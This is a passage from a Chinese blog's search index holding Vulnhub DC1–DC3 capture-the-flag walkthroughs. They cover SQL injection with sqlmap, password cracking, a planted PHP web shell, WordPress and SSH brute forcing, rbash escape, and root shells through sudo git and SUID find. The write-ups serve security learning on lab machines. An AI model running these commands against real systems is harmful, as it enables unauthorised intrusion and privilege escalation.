192.168.43.50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210508181447321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>从扫描结果可以得到Joomla版本为3.7.0，并且可以扫描出一下网站目录。<br>直接在漏洞库搜索是否有可利用漏洞。   </p><p>   <img src="https://img-blog.csdnimg.cn/20210508181502936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>发现两个可利用漏洞，一个sql注入，一个XSS，所以SQL注入比较合适，直接查看漏洞利用文本。(漏洞默认路径为/usr/share/exploitdb/exploits/给出的路径)<br>根据利用文本给出的sqlmap利用方式直接上工具sqlmap。</p><p><img src="https://img-blog.csdnimg.cn/20210508181515592.png"></p><p><img src="https://img-blog.csdnimg.cn/20210508181526175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>利用成功，爆出5个数据库，继续爆破joomladb中的表、字段。可以爆出表#__users,爆出字段username，password.</p><p><img src="https://img-blog.csdnimg.cn/20210508181538864.png"></p><p>需要对密码继续解密，将密码复制到新建文件pd.txt中，执行下面命令解密：</p><pre class="line-numbers language-none"><code class="language-none">john pd.txt --wordlist=/usr/share/wordlist/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210508181549515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>因为之前已经解密过，所以需要额外加一个命令看结果，之前没有解密过的可以直接出答案。解密结果为snoopy。</p><p><img src="https://img-blog.csdnimg.cn/20210508181602332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>成功登陆进去。<br>其他思路没有，所以只能查看网页内容，在首页Templates下发现了线索  </p><p><img src="https://img-blog.csdnimg.cn/20210508181618173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210508181630321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>进入protostar模块在index.php写入一句话木马，直接<code>蚁剑</code>连接。  </p><p><img src="https://img-blog.csdnimg.cn/20210508181642188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>连接成功。查看文件内容，没有什么发现，直接在进入交互模式。</p><p><img src="https://img-blog.csdnimg.cn/20210508181654360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>没发现什么办法提权，所以只能看看可不可以内核版本提权，所以漏洞库搜索看看有没有相关漏洞利用。</p><p><img src="https://img-blog.csdnimg.cn/20210508181705719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>发现可以提权的漏洞利用，查看利用方式。</p><p><img src="https://img-blog.csdnimg.cn/20210508181722169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>需要下载利用工具，最后一行给出了<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">下载地址</a>(国内网络可能下载不了)。</p><p><img src="https://img-blog.csdnimg.cn/20210508181733817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>下载完成，有两个压缩包，通过<code>蚁剑</code>将这’._exploit.tar’上传至靶机即可。解压———执行compile.sh——执行doubleput——提权成功。<br>成功拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC2靶场详解</title>
      <link href="/2021/05/05/dc2/"/>
      <url>/2021/05/05/dc2/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>DC-2靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="直接更改域名解析进网站拿flag1"><a href="#直接更改域名解析进网站拿flag1" class="headerlink" title="直接更改域名解析进网站拿flag1"></a><strong>直接更改域名解析进网站拿flag1</strong></h1><p>根据目标靶场的MAC地址得出IP为：192.168.31.182，直接上<code>nmap</code>扫描。<br><img src="/2021/05/05/dc2/050501.png"></p><p>可以发现开放了80端口，网页服务器但是可以看出做了域名解析，所以需要在本地即kali的配置文件**/etc/hosts<strong>文件写入<code>192.168.31.182   dc-2</code>即可完成本地域名解析。还可以看出网站是由</strong>WordPress**内容管理系统搭建的。<br>还开放了7744端口，可以知道使用协议是ssh，所以可以远程连接。</p><p><img src="/2021/05/05/dc2/050502.png"></p><p>直接访问网站可以找到flag1</p><h1 id="爆破用户进后台拿flag2"><a href="#爆破用户进后台拿flag2" class="headerlink" title="爆破用户进后台拿flag2"></a><strong>爆破用户进后台拿flag2</strong></h1><p>查看flag1中的内容，<code>cewl</code>是一个网页关键字抓取工具，<code>WordPress</code>有一个kali自带扫描工具<strong>wpscan</strong>可以爆破网站的用户名，所以想到了用关键字作为密码继续进行爆破。</p><p><code>wpscan --url dc-2 -e u</code>可以查看网站用户，得出结果有三个用户<strong>admin</strong>,<strong>jerry</strong>,<strong>tom</strong>,将这三个用户保存在us.txt文件中</p><p><code>cewl dc-2 -w pds.txt</code>将网站首页下的关键词生成密码字典pds.txt.</p><p><code>wpscan --url dc-2 -U us.txt -P pds.txt</code>爆破口令。</p><p><img src="/2021/05/05/dc2/050504.png"></p><p>爆破出两个口令。<code>WordPrss</code>默认后台路径为<strong>wp-admin</strong>.登陆jerry/adipiscing直接发现flag2.</p><p><img src="/2021/05/05/dc2/050505.png"></p><h1 id="登陆ssh-绕过rbash限制拿flag3"><a href="#登陆ssh-绕过rbash限制拿flag3" class="headerlink" title="登陆ssh,绕过rbash限制拿flag3"></a><strong>登陆ssh,绕过rbash限制拿flag3</strong></h1><p>根据提示不能从<code>WordPrss</code>上面找到捷径，登陆tom也没有发现什么，这是时想到了还有7744端口，因为它是ssh协议所以直接尝试ssh连接。由于端口号不是22，所以需要用<code>-p 7744</code>指定端口号。</p><p><img src="/2021/05/05/dc2/050506.png"></p><p>果不其然，tom登陆成功。查看tom用户下的文件看看有不有什么发现。</p><p><img src="/2021/05/05/dc2/050507.png"></p><p>虽然发现了flag3.txt，但是读取不了，受到<a href="https://www.freebuf.com/articles/system/188989.html"><code>rbash</code>环境</a>的限制，需要绕过<code>rbash</code>限制。(查看<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">大佬的博客</a>搞定的，之前没接触过，哎，小白一匹)<br>执行以下命令进行绕过</p><pre class="line-numbers language-none"><code class="language-none">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/05/dc2/050508.png"></p><p>成功拿到flag3.</p><h1 id="su切换用户拿flag4"><a href="#su切换用户拿flag4" class="headerlink" title="su切换用户拿flag4"></a><strong>su切换用户拿flag4</strong></h1><p>根据flag3的提示需要<code>su jerry</code>。</p><p><img src="/2021/05/05/dc2/050509.png"></p><p>直接在jerry根目录下拿到flag4.</p><h1 id="git提权拿final-flag"><a href="#git提权拿final-flag" class="headerlink" title="git提权拿final-flag"></a><strong>git提权拿final-flag</strong></h1><p>根据提示需要拿到root权限<br>执行命令<code>sudo -l</code>发现git不需要命令具有root权限执行。于是强制进入git交互模式。输入命令</p><pre class="line-numbers language-none"><code class="language-none">sudo git help config!/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/05/05/dc2/050510.png"></p><p>提权成功拿到final-flag.txt.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC1靶场详解</title>
      <link href="/2021/05/04/dc1/"/>
      <url>/2021/05/04/dc1/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>DC-1靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="drupal-7-x漏洞拿flag1"><a href="#drupal-7-x漏洞拿flag1" class="headerlink" title="drupal 7.x漏洞拿flag1"></a><strong>drupal 7.x漏洞拿flag1</strong></h1><p>首先搭建好靶场。这次一次黑盒靶场测试，只能从虚拟机中查看DC1靶场的mac地址，从而查出目标靶机的IP。</p><p><img src="/2021/05/04/dc1/050401.png"></p><p><img src="/2021/05/04/dc1/050402.png"></p><p>所以目标IP地址为192.168.31.184，直接上nmap进行目标全面扫描。</p><p><img src="/2021/05/04/dc1/050403.png"></p><p>由nmap扫描可以知道，目标靶机开放了22,80,111,42875端口，看到端口号22想到ssh远程连接，端口号80想到web网页攻击。后面两个端口暂时想不到有什么用，所以先放在一般后面可能会用到。所以直接访问网页。</p><p><img src="/2021/05/04/dc1/050405.png"></p><p>由网页可以明显看出本站是由使用<code>PHP</code>语言编写的开源内容管理系统<code>Drupal</code>搭建的，并且由<code>Wappalyzer</code>得知版本为7.X，所以直接使用<code>searchsploit</code>命令在漏洞库中搜索此版本是否有漏洞可以利用。</p><p><img src="/2021/05/04/dc1/050407.png"></p><p>可以看到由许多可以利用的漏洞，所以我们选择最后一个远程代码执行漏洞，因为这个漏洞可以利用漏洞攻击神奇<code>metasploit</code>进行攻击。</p><p><img src="/2021/05/04/dc1/050408.png"></p><p>直接使用模块，使用命令<code>info</code>可以查看漏洞的相关信息，也可以查看攻击模块需要设置的参数。根据要求设置参数。</p><p><img src="/2021/05/04/dc1/050409.png"></p><p>根据要求只需要设置<code>RHOSTS</code>即目标靶场的IP，设置完成执行<code>run</code>命令即可进入<code>shell</code>环境。</p><p><img src="/2021/05/04/dc1/050410.png"></p><p>由于得到的不是一个完整的<code>shell</code>环境，所以我们所以<code>pyhton</code>中的<code>pty</code>模块反弹一个完整的<code>shell</code>环境,即直接输入</p><pre class="line-numbers language-none"><code class="language-none">python -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接上命令，可以得到flag1</p><h1 id="在目录中找配置文件拿flag2"><a href="#在目录中找配置文件拿flag2" class="headerlink" title="在目录中找配置文件拿flag2"></a><strong>在目录中找配置文件拿flag2</strong></h1><p>根据flag1.txt中的’Every good CMS needs a config file - and so do you.’（意思差不多：每个好的内容管理系统都需要一个配置文件，所以你应该怎么做）提示，所以直接从实名命令执行得到的目录里面找配置文件。</p><p><img src="/2021/05/04/dc1/050412.png"></p><p>最终在<code>sites/default/default.setting.php</code>中找到的(不要问我怎么找到的，问就是不知道)(觉得可疑的目录和文件就一个一个试呗)<br>于是得到了flag2</p><h1 id="改密码进网站拿flag2"><a href="#改密码进网站拿flag2" class="headerlink" title="改密码进网站拿flag2"></a><strong>改密码进网站拿flag2</strong></h1><p>根据flag2提示(提示内容大概意思是：爆破和目录扫描并不是唯一获得后台的方法(并且你需要访问权限)，下面这些认证信息你怎么使用)。<br>给出的是数据库的相关信息，所以我们直接本地登陆数据库。</p><p><img src="/2021/05/04/dc1/050415.png"></p><p>查看表users中的内容可以知道用户名和密码。</p><p><img src="/2021/05/04/dc1/050416.png"></p><p>但是一般加盐的密码是很难破解的，所以选择修改用户密码来解决。首先生成自定密码的加盐哈希值。回到网站的目录下执行<code>php scripts/password-hash.sh 密码</code>命令生成。</p><p><img src="/2021/05/04/dc1/050420.png"></p><p>修改密码，并且确认是否修改完成</p><p><img src="/2021/05/04/dc1/050421.png"></p><p>修改完成回到网页登陆，登陆成功</p><p><img src="/2021/05/04/dc1/050422.png"></p><p><img src="/2021/05/04/dc1/050423.png"></p><p>得到flag3</p><h1 id="ssh爆破拿flag4"><a href="#ssh爆破拿flag4" class="headerlink" title="ssh爆破拿flag4"></a><strong>ssh爆破拿flag4</strong></h1><p>从flag3中提示发现<code>passwd</code>,<code>shadow</code>所以查看根目录/etc下的这两个文件；</p><p><img src="/2021/05/04/dc1/050424.png"></p><p><strong>/etc/shadow</strong>无法查看，权限不够，查看<strong>etc/passwd</strong>，发现目标靶机用户flag4,并且有/bin/bash，看到这想到了还有端口22，所以ssh连接。但是密码不知道所以只能用爆破神器<code>hydra</code>。<br>用kali自带密码字典，路径为**/usr/share/john/password.lst**,kali自带各种密码默认保存在**/usr/share/**下。</p><p><img src="/2021/05/04/dc1/050425.png"></p><p><img src="/2021/05/04/dc1/050426.png"></p><p>爆出结果为’orange’，所以直接ssh连接，进入家目录查看发现flag4.</p><p><img src="/2021/05/04/dc1/050427.png"></p><h1 id="提权拿最后的flag"><a href="#提权拿最后的flag" class="headerlink" title="提权拿最后的flag"></a><strong>提权拿最后的flag</strong></h1><p>根据提示需要得到root权限才能得到falg。</p><p>liunx提权一般有四种提权方式：</p><ol><li>sudo提权，通过命令<code>sudo -l</code>查看是否有可提权的命令。</li><li>suid提权，通过命令<code>find / -perm -4000 2&gt;/dev/null</code>查看是否具有root权限的命令</li><li>系统版本内核提权。</li><li>通过数据库提权。</li></ol><p><img src="/2021/05/04/dc1/050428.png"></p><p>发现<em>find</em>具有root权限。(哪些可以进行提权可以在网上查，提权用法可以临时查)<br>直接执行命令<code>find -exec /bin/sh \;</code>进行提权</p><p><img src="/2021/05/04/dc1/050431.png"></p><p>提权完成，拿到最后的thefinalflag.txt.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
